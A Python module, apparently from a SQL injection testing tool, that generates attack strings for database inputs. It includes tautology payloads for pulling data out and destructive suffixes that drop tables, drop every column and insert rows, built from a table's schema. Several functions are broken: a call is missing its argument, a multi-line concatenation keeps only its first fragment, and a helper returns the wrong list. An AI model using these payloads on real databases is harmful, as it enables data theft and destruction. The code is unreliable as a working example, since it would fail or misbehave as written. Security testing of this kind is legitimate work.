from db_table_settings import DB_table_settings

BASIC_NUMERICAL_INPUT = "1"

BASIC_TEXT_INPUT = "admin"

EXFILTRATION_SUFFIXES = [
    "1' OR '1'='1",
    "1' OR '1'='1' -- ",
    "' OR ''='",
]




def generate_tainted_text_inputs_for_exfiltration() -> list[str]:

  tainted_text_inputs: list[str] = []
  for suffix in EXFILTRATION_SUFFIXES:

    tainted_text_inputs.append(BASIC_TEXT_INPUT + suffix)
  return tainted_text_inputs



def generate_tainted_text_inputs_for_corruption() -> list[str]:

  tainted_text_inputs: list[str] = []
  for suffix in EXFILTRATION_SUFFIXES:

    tainted_text_inputs.append(BASIC_TEXT_INPUT + suffix)
  return tainted_text_inputs



def generate_tainted_queries_for_exfiltration(basic_query: str) -> list[str]:
  
  tainted_queries: list[str] = []
  for suffix in EXFILTRATION_SUFFIXES:

    tainted_queries.append(basic_query + suffix)
  return tainted_queries



def generate_tainted_queries_for_corruption(basic_query: str) -> list[str]:
  
  CORRUPTION_SUFFIXES: list[str] = generate_corruption_suffixes()
  tainted_queries: list[str] = []
  for suffix in CORRUPTION_SUFFIXES:

    tainted_queries.append(basic_query + suffix)
  return tainted_queries



def generate_corruption_suffixes(db_table_settings: DB_table_settings) -> list[str]:
  table_name: str = db_table_settings.table_name
  column_names: list[str] = db_table_settings.column_names
  column_datatypes: list[str] = db_table_settings.data_types

  CORRUPTION_SUFFIXES = [
    f"'; DROP TABLE {table_name};--",
    f"'; ALTER TABLE {table_name} ADD COLUMN new_column TEXT; --",
  ]
  CORRUPTION_SUFFIXES.append( build_insert_suffixe(table_name, column_names, column_datatypes) )
  add_drop_column_suffixes(table_name, column_names, CORRUPTION_SUFFIXES)
  return CORRUPTION_SUFFIXES



def add_drop_column_suffixes(table_name: str, column_names: list[str], CORRUPTION_SUFFIXES: list[str]):

  for column_name in column_names:
    CORRUPTION_SUFFIXES.append(f"'; ALTER TABLE {table_name} DROP COLUMN {column_name}; --")



def build_insert_suffixe(table_name: str, column_names: list[str], column_datatypes: list[str]):

  INSERTION_SUFFIXE: str = f"'; INSERT INTO {table_name} " 
  + format_list_to_string(column_names)
  + " VALUES "
  + format_list_to_string( get_default_from_datatype(column_datatypes) )
  + "; --"

  return INSERTION_SUFFIXE


def format_list_to_string(list: list[str]) -> str:

  formatted_string: str = "("
  for string in list:

    formatted_string += string + ","
  return formatted_string[:-1] + ')'



def get_default_from_datatype(list_of_datatypes: list[str]) -> list[str]:
  list_of_defaults: list[str] = []
  for datatype in list_of_datatypes:
    if datatype.lower() == 'text':
      list_of_defaults.append('hack_string')
    elif datatype.lower() == 'int':
      list_of_defaults.append('1')
    else:
      raise Exception("Error : a datatype can be TEXT or INT")

  return list_of_datatypes